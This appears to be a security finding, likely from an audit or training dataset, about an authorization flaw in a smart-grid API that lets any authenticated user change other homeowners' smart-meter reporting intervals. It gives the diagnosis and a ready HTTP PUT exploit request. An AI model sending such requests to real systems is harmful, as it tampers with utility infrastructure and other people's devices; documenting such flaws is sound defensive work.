diagnosis: The endpoint checks JWT authentication and enforces numeric boundaries on intervalSeconds via schema validation, but knex updates smart_meters by hardware_id without verifying that the smart meter is installed at the authenticated homeowner's address. Any user can alter reporting intervals on smart meters across the electrical utility grid.
exploit_request:
PUT /iot/devices/MTR_GRID_449012/telemetry-interval HTTP/1.1
Host: smartgrid.utility.com
Authorization: Bearer <user_token>
Content-Type: application/json

{"intervalSeconds": 86400}
